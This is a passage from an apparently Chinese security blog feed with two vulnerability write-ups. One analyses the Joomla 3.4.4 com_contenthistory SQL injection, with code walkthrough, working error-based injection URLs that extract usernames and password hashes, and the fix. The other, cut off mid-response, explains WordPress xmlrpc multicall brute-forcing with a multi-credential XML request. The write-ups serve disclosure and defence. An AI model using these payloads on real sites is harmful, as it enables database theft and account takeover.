    <content type="html"><![CDATA[<p>昨日(2015-10-22)，Joomla CMS发布新版本3.4.5，该版本修复了一个高危的SQL注入漏洞，3.2至3.4.4版本都受到影响。攻击者通过该漏洞可以直接获取获取数据库中敏感信息，甚至可以获取已登陆的管理员会话直接进入网站后台。</p><h3 id="一、原理分析"><a href="#一、原理分析" class="headerlink" title="一、原理分析"></a>一、原理分析</h3><p>在 Joomla CMS 中有一个查看历史编辑版本的组件(com_contenthistory)，该功能本应只有管理员才能访问，但是由于开发人员的疏忽，导致该功能的访问并不需要相应的权限。通过访问 <code>/index.php?option=com_contenthistory</code> 可以使得服务端加载历史版本处理组件。程序流程会转到 <code>/components/com_contenthistory/contenthistory.php</code> 文件中：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">defined(<span class="string">'_JEXEC'</span>) <span class="keyword">or</span> <span class="keyword">die</span>;</span><br><span class="line"></span><br><span class="line">$lang = JFactory::getLanguage();</span><br><span class="line">$lang-&gt;load(<span class="string">'com_contenthistory'</span>, JPATH_ADMINISTRATOR, <span class="keyword">null</span>, <span class="keyword">false</span>, <span class="keyword">true</span>)</span><br><span class="line">||    $lang-&gt;load(<span class="string">'com_contenthistory'</span>, JPATH_SITE, <span class="keyword">null</span>, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> JPATH_COMPONENT_ADMINISTRATOR . <span class="string">'/contenthistory.php'</span>;</span><br></pre></td></tr></table></figure><p>可以看到该组件加载时并没有进行相关权限的监测，而 Joomla 中，一般的后台调用组件 (<code>/administrator/components/</code>下的组件) 都会进行组件对应的权限检查，例如后台中的 <code>com_contact</code> 组件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!JFactory::getUser()-&gt;authorise(<span class="string">'core.manage'</span>, <span class="string">'com_contact'</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> JError::raiseWarning(<span class="number">404</span>, JText::_(<span class="string">'JERROR_ALERTNOAUTHOR'</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是，程序在处理 <code>contenthistory</code> 组建时，并没有进行一个权限检查，程序初始化并设置好组件相关配置后，包含文件 <code>/administrator/components/com_contenthistory/contenthistory.php</code>，其内容如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">defined(<span class="string">'_JEXEC'</span>) <span class="keyword">or</span> <span class="keyword">die</span>;</span><br><span class="line"></span><br><span class="line">$controller = JControllerLegacy::getInstance(<span class="string">'Contenthistory'</span>, <span class="keyword">array</span>(<span class="string">'base_path'</span> =&gt; JPATH_COMPONENT_ADMINISTRATOR));</span><br><span class="line">$controller-&gt;execute(JFactory::getApplication()-&gt;input-&gt;get(<span class="string">'task'</span>));</span><br><span class="line">$controller-&gt;redirect();</span><br></pre></td></tr></table></figure><p>程序初始化基于 <code>contenthistory</code> 组件的控制类 <code>JControllerLegacy</code>，然后直接调用控制类的 <code>execute()</code> 方法，在 <code>execute()</code> 方法中，会调用其控制类中的 <code>display()</code>，代码位于 <code>/libraries/legacy/controller/legacy.php</code>：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($cachable = false, $urlparams = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $document = JFactory::getDocument();</span><br><span class="line">    $viewType = $document-&gt;getType();</span><br><span class="line">    $viewName = <span class="keyword">$this</span>-&gt;input-&gt;get(<span class="string">'view'</span>, <span class="keyword">$this</span>-&gt;default_view);</span><br><span class="line">    $viewLayout = <span class="keyword">$this</span>-&gt;input-&gt;get(<span class="string">'layout'</span>, <span class="string">'default'</span>, <span class="string">'string'</span>);</span><br><span class="line"></span><br><span class="line">    $view = <span class="keyword">$this</span>-&gt;getView($viewName, $viewType, <span class="string">''</span>, <span class="keyword">array</span>(<span class="string">'base_path'</span> =&gt; <span class="keyword">$this</span>-&gt;basePath, <span class="string">'layout'</span> =&gt; $viewLayout));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get/Create the model</span></span><br><span class="line">    <span class="keyword">if</span> ($model = <span class="keyword">$this</span>-&gt;getModel($viewName))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Push the model into the view (as default)</span></span><br><span class="line">        $view-&gt;setModel($model, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    (...省略...)</span><br><span class="line">    <span class="keyword">if</span> ($cachable &amp;&amp; $viewType != <span class="string">'feed'</span> &amp;&amp; $conf-&gt;get(<span class="string">'caching'</span>) &gt;= <span class="number">1</span>)</span><br><span class="line">    &#123; (...省略...) &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $view-&gt;display();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>处理程序从传递的参数中获取 <code>view</code> 和 <code>layout</code> 的参数值进行初始化视图，并且调用 <code>$model = $this-&gt;getModel($viewName)</code> 加载对应数据模型，最终会调用 <code>$view-&gt;display()</code> 函数进行视图处理。</p><p>Joomla 新版本 3.4.5 中修复的SQL注入漏洞涉及的是历史查看操作，也就是 <code>view=history</code> 时的程序处理会导致注入。在程序进行数据提取时，会进入 <code>/administrator/components/com_contenthistory/models/history.php</code> 文件中的 <code>getListQuery()</code> 函数：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getListQuery</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// Create a new query object.</span></span><br><span class="line">$db = <span class="keyword">$this</span>-&gt;getDbo();</span><br><span class="line">$query = $db-&gt;getQuery(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Select the required fields from the table.</span></span><br><span class="line">$query-&gt;select(</span><br><span class="line"><span class="keyword">$this</span>-&gt;getState(</span><br><span class="line"><span class="string">'list.select'</span>,</span><br><span class="line"><span class="string">'h.version_id, h.ucm_item_id, h.ucm_type_id, h.version_note, h.save_date, h.editor_user_id,'</span> .</span><br><span class="line"><span class="string">'h.character_count, h.sha1_hash, h.version_data, h.keep_forever'</span></span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line">-&gt;from($db-&gt;quoteName(<span class="string">'#__ucm_history'</span>) . <span class="string">' AS h'</span>)</span><br><span class="line">-&gt;where($db-&gt;quoteName(<span class="string">'h.ucm_item_id'</span>) . <span class="string">' = '</span> . <span class="keyword">$this</span>-&gt;getState(<span class="string">'item_id'</span>))</span><br><span class="line">-&gt;where($db-&gt;quoteName(<span class="string">'h.ucm_type_id'</span>) . <span class="string">' = '</span> . <span class="keyword">$this</span>-&gt;getState(<span class="string">'type_id'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// Join over the users for the editor</span></span><br><span class="line">-&gt;select(<span class="string">'uc.name AS editor'</span>)</span><br><span class="line">-&gt;join(<span class="string">'LEFT'</span>, <span class="string">'#__users AS uc ON uc.id = h.editor_user_id'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Add the list ordering clause.</span></span><br><span class="line">$orderCol = <span class="keyword">$this</span>-&gt;state-&gt;get(<span class="string">'list.ordering'</span>);</span><br><span class="line">$orderDirn = <span class="keyword">$this</span>-&gt;state-&gt;get(<span class="string">'list.direction'</span>);</span><br><span class="line">$query-&gt;order($db-&gt;quoteName($orderCol) . $orderDirn);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $query;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意下面这段SQL语句构造部分：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$query-&gt;select(</span><br><span class="line"><span class="keyword">$this</span>-&gt;getState(</span><br><span class="line"><span class="string">'list.select'</span>,</span><br><span class="line"><span class="string">'h.version_id, h.ucm_item_id, h.ucm_type_id, h.version_note, h.save_date, h.editor_user_id,'</span> .</span><br><span class="line"><span class="string">'h.character_count, h.sha1_hash, h.version_data, h.keep_forever'</span></span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line">-&gt;from($db-&gt;quoteName(<span class="string">'#__ucm_history'</span>) . <span class="string">' AS h'</span>)</span><br><span class="line">-&gt;where($db-&gt;quoteName(<span class="string">'h.ucm_item_id'</span>) . <span class="string">' = '</span> . <span class="keyword">$this</span>-&gt;getState(<span class="string">'item_id'</span>))</span><br><span class="line">-&gt;where($db-&gt;quoteName(<span class="string">'h.ucm_type_id'</span>) . <span class="string">' = '</span> . <span class="keyword">$this</span>-&gt;getState(<span class="string">'type_id'</span>))</span><br></pre></td></tr></table></figure><p>其中 <code>getState()</code> 函数用于获取模型的属性和其对应的值，其函数定义位于 <code>/ibraries/legacy/model/legacy.php</code>：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getState</span><span class="params">($property = null, $default = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;__state_set)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Protected method to auto-populate the model state.</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;populateState();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set the model state set flag to true.</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;__state_set = <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $property === <span class="keyword">null</span> ? <span class="keyword">$this</span>-&gt;state : <span class="keyword">$this</span>-&gt;state-&gt;get($property, $default);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后会调用 <code>populateState()</code> 函数来初始化参数值和提取并过滤某些参数，在 <code>contenthistory</code> 组建中定义有自己的 <code>populateState()</code> 函数：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">populateState</span><span class="params">($ordering = null, $direction = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">(...省略...)</span><br><span class="line"><span class="comment">// List state information.</span></span><br><span class="line"><span class="keyword">parent</span>::populateState(<span class="string">'h.save_date'</span>, <span class="string">'DESC'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数最后，会调用父类的 <code>populateState()</code> 函数，因为该数据模型继承于 JModelList，所以父类相关代码位于 <code>/libraries/legacy/model/list.php</code> 中，而在父类该函数的处理中会解析请求中传递的 <code>list[]</code> 参数，解析并过滤预设键的值，但是却忽略了 <code>list[select]</code>：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">populateState</span><span class="params">($ordering = null, $direction = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">(...省略...)</span><br><span class="line"><span class="comment">// Receive &amp; set list options</span></span><br><span class="line"><span class="keyword">if</span> ($list = $app-&gt;getUserStateFromRequest(<span class="keyword">$this</span>-&gt;context . <span class="string">'.list'</span>, <span class="string">'list'</span>, <span class="keyword">array</span>(), <span class="string">'array'</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">foreach</span> ($list <span class="keyword">as</span> $name =&gt; $value)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Extra validations</span></span><br><span class="line"><span class="keyword">switch</span> ($name)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'fullordering'</span>:</span><br><span class="line">(...省略...)</span><br><span class="line"><span class="keyword">case</span> <span class="string">'ordering'</span>:</span><br><span class="line">(...省略...)</span><br><span class="line"><span class="keyword">case</span> <span class="string">'direction'</span>:</span><br><span class="line">(...省略...)</span><br><span class="line"><span class="keyword">case</span> <span class="string">'limit'</span>:</span><br><span class="line">(...省略...)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">$value = $value;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;setState(<span class="string">'list.'</span> . $name, $value);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">(...省略...)</span><br></pre></td></tr></table></figure><p>而传递 <code>list[select]</code> 参数值最终会被解析到上述组件视图进行处理时 SQL 语句构建中的 <code>list.select</code> 里，从而导致了注入。</p><h3 id="二、漏洞演示"><a href="#二、漏洞演示" class="headerlink" title="二、漏洞演示"></a>二、漏洞演示</h3><p>通过上面简单的分析，已经知道了受影响的 Joomla 版本中，<code>contenthistory</code> 组件访问不受权限的控制，并且当进行 <code>view=history</code> 请求时会解析请求参数中 <code>list[select]</code> 的值拼接到 SQL 语句中。下面是该漏洞的简单验证和利用方法。</p><p><em>1.漏洞验证</em></p><pre><code>http://http://172.16.96.130/xampp/Joomla-3.4.4/index.php?option=com_contenthistory&amp;view=history&amp;list[select]=1</code></pre><p>因为在进行 SQL 语句拼接的时候，获取了 <code>list.ordering</code> 进行数据查询中的 <code>order</code> 操作，若不提供默认会将其设置为数据进行处理，相关处理位于 <code>/libraries/joomla/database/driver.php</code> 的 quoteName() 函数中。</p><p>因此，访问上述构造的URL，服务器会报错：</p><p><img src="/images/articles/2015-10-23-joomla_cms_contenthistory_sql_injection_vulnerability/1.png" alt=""></p><p><em>2.漏洞利用</em></p><p>因为在 SQL 语句拼接时，程序框架针对每个 <code>from</code> 或者 <code>where</code> 操作进行了换行处理，所以这里并不能使用 <code>#</code>、<code>--</code> 等符号来注释掉后面的语句，只能通过报错注入进行数据提取。但是语句的成功执行有一定的前提条件，也就是传递的 <code>item_id</code> 和 <code>type_id</code> 参数值必须于数据库中有效，同时传递 <code>list[ordering]</code> 参数 (空值即可)，这样注入的语句才能够得到执行，从而进行报错注入。</p><p>这里经过多个漏洞站点的测试可以简单的使用 <code>item_id=1&amp;type_id=1</code>，当然了为了准确性和有效性，可以通过爆破的方式来得到这两个参数的有效值，然后再进行注入操作。</p><p>(Tips：Joomla 中构造的 SQL 语句中 <code>#_</code> 最终会在执行前被替换为表前缀)</p><p>下面是获取用户名/密码哈希的漏洞演示过程：</p><pre><code>http://http://172.16.96.130/xampp/Joomla-3.4.4/index.php?option=com_contenthistory&amp;view=history&amp;item_id=1&amp;type_id=1&amp;list[ordering]&amp;list[select]=(select 1 from (select count(*),concat((select username from %23__users limit 0,1),floor(rand(0)*2)) from information_schema.tables group by 2)x)</code></pre><p><img src="/images/articles/2015-10-23-joomla_cms_contenthistory_sql_injection_vulnerability/2.png" alt=""></p><pre><code>http://172.16.96.130/xampp/Joomla-3.4.4/index.php?option=com_contenthistory&amp;view=history&amp;item_id=1&amp;type_id=1&amp;list[ordering]&amp;list[select]=(select 1 from (select count(*),concat((select password from %23__users limit 0,1),floor(rand(0)*2)) from information_schema.tables group by 2)x)</code></pre><p><img src="/images/articles/2015-10-23-joomla_cms_contenthistory_sql_injection_vulnerability/3.png" alt=""></p><h3 id="三、修复方案"><a href="#三、修复方案" class="headerlink" title="三、修复方案"></a>三、修复方案</h3><ol><li>从 <a href="https://github.com/joomla/joomla-cms/releases" target="_blank" rel="noopener">https://github.com/joomla/joomla-cms/releases</a> 获取最新版本进行重新安装；</li><li>从 <a href="https://github.com/joomla/joomla-cms/releases" target="_blank" rel="noopener">https://github.com/joomla/joomla-cms/releases</a> 下载相应版本的补丁程序进行升级；</li></ol><h3 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h3><p>就 Joomla CMS 的用户量来看，目前还有大量的站点的数据正受到该漏洞的威胁。该漏洞的产生本质上是由于访问控制的缺失和过滤不严格造成。访问控制的缺失导致本应只有管理员才能进行访问和加载的 <code>contenthistory</code> 组件能够被任意用户访问和加载，而参数的过滤不严格，导致攻击者能够构造出恶意的参数到执行流中产生注入。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://www.sebug.net/vuldb/ssvid-89680" target="_blank" rel="noopener">http://www.sebug.net/vuldb/ssvid-89680</a></li><li><a href="https://blog.sucuri.net/2015/10/joomla-3-4-5-released-fixing-a-serious-sql-injection-vulnerability.html" target="_blank" rel="noopener">https://blog.sucuri.net/2015/10/joomla-3-4-5-released-fixing-a-serious-sql-injection-vulnerability.html</a></li><li><a href="https://www.trustwave.com/Resources/SpiderLabs-Blog/Joomla-SQL-Injection-Vulnerability-Exploit-Results-in-Full-Administrative-Access/" target="_blank" rel="noopener">https://www.trustwave.com/Resources/SpiderLabs-Blog/Joomla-SQL-Injection-Vulnerability-Exploit-Results-in-Full-Administrative-Access/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;昨日(2015-10-22)，Joomla CMS发布新版本3.4.5，该版本修复了一个高危的SQL注入漏洞，3.2至3.4.4版本都受到影响。攻击者通过该漏洞可以直接获取获取数据库中敏感信息，甚至可以获取已登陆的管理员会话直接进入网站后台。&lt;/p&gt;
&lt;h3 id=&quot;一、原
      
    
    </summary>
    
    
      <category term="security" scheme="http://rickgray.me/tags/security/"/>
    
      <category term="web" scheme="http://rickgray.me/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>WordPress 利用 /xmlrpc 高效爆破原理分析</title>
    <link href="http://rickgray.me/2015/10/09/wordpress-xmlrpc-brute-force-in-one-request/"/>
    <id>http://rickgray.me/2015/10/09/wordpress-xmlrpc-brute-force-in-one-request/</id>
    <published>2015-10-08T16:00:00.000Z</published>
    <updated>2018-04-24T15:46:55.754Z</updated>
    
    <content type="html"><![CDATA[<p>xmlrpc 是 WordPress 中进行远程调用的接口，而使用 xmlrpc 调用接口进行账号爆破在很早之前就被提出并加以利用。近日 <a href="https://blog.sucuri.net/2015/10/brute-force-amplification-attacks-against-wordpress-xmlrpc.html" target="_blank" rel="noopener">SUCURI</a> 发布文章介绍了如何利用 xmlrpc 调用接口中的 <code>system.multicall</code> 来提高爆破效率，使得成千上万次的帐号密码组合尝试能在一次请求完成，极大的压缩请求次数，在一定程度上能够躲避日志的检测。</p><h3 id="一、原理分析"><a href="#一、原理分析" class="headerlink" title="一、原理分析"></a>一、原理分析</h3><p>WordPress 中关于 xmlrpc 服务的定义代码主要位于 <code>wp-includes/class-IXR.php</code> 和 <code>wp-includes/class-wp-xmlrpc-server.php</code> 中。基类 IXR_Server 中定义了三个内置的调用方法，分别为 <code>system.getCapabilities</code>，<code>system.listMethods</code> 和 <code>system.multicall</code>，其调用映射位于 <code>IXR_Server</code> 基类定义中：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setCallbacks</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;callbacks[<span class="string">'system.getCapabilities'</span>] = <span class="string">'this:getCapabilities'</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;callbacks[<span class="string">'system.listMethods'</span>] = <span class="string">'this:listMethods'</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;callbacks[<span class="string">'system.multicall'</span>] = <span class="string">'this:multiCall'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而基类在初始化时，调用 setCallbacks() 绑定了调用映射关系：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">( $callbacks = false, $data = false, $wait = false )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;setCapabilities();</span><br><span class="line">    <span class="keyword">if</span> ($callbacks) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;callbacks = $callbacks;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;setCallbacks();  <span class="comment">// 绑定默认的三个基本调用映射</span></span><br><span class="line">    <span class="keyword">if</span> (!$wait) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;serve($data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再来看看 <code>system.multicall</code> 对应的处理函数：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">multiCall</span><span class="params">($methodcalls)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// See http://www.xmlrpc.com/discuss/msgReader$1208</span></span><br><span class="line">    $return = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span> ($methodcalls <span class="keyword">as</span> $call) &#123;</span><br><span class="line">        $method = $call[<span class="string">'methodName'</span>];</span><br><span class="line">        $params = $call[<span class="string">'params'</span>];</span><br><span class="line">        <span class="keyword">if</span> ($method == <span class="string">'system.multicall'</span>) &#123;</span><br><span class="line">            $result = <span class="keyword">new</span> IXR_Error(<span class="number">-32600</span>, <span class="string">'Recursive calls to system.multicall are forbidden'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $result = <span class="keyword">$this</span>-&gt;call($method, $params);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_a($result, <span class="string">'IXR_Error'</span>)) &#123;</span><br><span class="line">            $return[] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">'faultCode'</span> =&gt; $result-&gt;code,</span><br><span class="line">                <span class="string">'faultString'</span> =&gt; $result-&gt;message</span><br><span class="line">            );</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $return[] = <span class="keyword">array</span>($result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以从代码中看出，程序会解析请求传递的 XML，遍历多重调用中的每一个接口调用请求，并会将最终有调用的结果合在一起返回给请求端。</p><p>通过阅读 WordPress 中 xmlrpc 相关处理的代码，能大量的 xmlrpc 调用都验证了用户名和密码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !$user = <span class="keyword">$this</span>-&gt;login($username, $password) )</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;error;</span><br></pre></td></tr></table></figure><p>通过搜索上述登录验证代码可以得到所有能够用来进行爆破的调用方法列表如下： </p><pre><code>wp.getUsersBlogs, wp.newPost, wp.editPost, wp.deletePost, wp.getPost, wp.getPosts, wp.newTerm, wp.editTerm, wp.deleteTerm, wp.getTerm, wp.getTerms, wp.getTaxonomy, wp.getTaxonomies, wp.getUser, wp.getUsers, wp.getProfile, wp.editProfile, wp.getPage, wp.getPages, wp.newPage, wp.deletePage, wp.editPage, wp.getPageList, wp.getAuthors, wp.getTags, wp.newCategory, wp.deleteCategory, wp.suggestCategories, wp.getComment, wp.getComments, wp.deleteComment, wp.editComment, wp.newComment, wp.getCommentStatusList, wp.getCommentCount, wp.getPostStatusList, wp.getPageStatusList, wp.getPageTemplates, wp.getOptions, wp.setOptions, wp.getMediaItem, wp.getMediaLibrary, wp.getPostFormats, wp.getPostType, wp.getPostTypes, wp.getRevisions, wp.restoreRevision, blogger.getUsersBlogs, blogger.getUserInfo, blogger.getPost, blogger.getRecentPosts, blogger.newPost, blogger.editPost, blogger.deletePost, mw.newPost, mw.editPost, mw.getPost, mw.getRecentPosts, mw.getCategories, mw.newMediaObject, mt.getRecentPostTitles, mt.getPostCategories, mt.setPostCategories</code></pre><p>这里是用参数传递最少获取信息最直接的 <code>wp.getUsersBlogs</code> 进行测试，将两次帐号密码尝试包含在同一次请求里，构造 XML 请求内容为：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>system.multicall<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">params</span>&gt;</span><span class="tag">&lt;<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">array</span>&gt;</span><span class="tag">&lt;<span class="name">data</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">struct</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">member</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>methodName<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>wp.getUsersBlogs<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">member</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">member</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>params<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">array</span>&gt;</span><span class="tag">&lt;<span class="name">data</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>admin888<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">data</span>&gt;</span><span class="tag">&lt;/<span class="name">array</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">member</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">struct</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">      </span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">struct</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">member</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>methodName<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>wp.getUsersBlogs<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">member</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">member</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>params<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">array</span>&gt;</span><span class="tag">&lt;<span class="name">data</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>guest<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>test<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">data</span>&gt;</span><span class="tag">&lt;/<span class="name">array</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">member</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">struct</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">data</span>&gt;</span><span class="tag">&lt;/<span class="name">array</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">param</span>&gt;</span><span class="tag">&lt;/<span class="name">params</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将上面包含两个子调用的 XML 请求发送至 xmlrpc 服务端入口，若目标开启了 xmlrpc 服务会返回类似如下的信息：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">methodResponse</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">params</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">array</span>&gt;</span><span class="tag">&lt;<span class="name">data</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">array</span>&gt;</span><span class="tag">&lt;<span class="name">data</span>&gt;</span></span><br><span 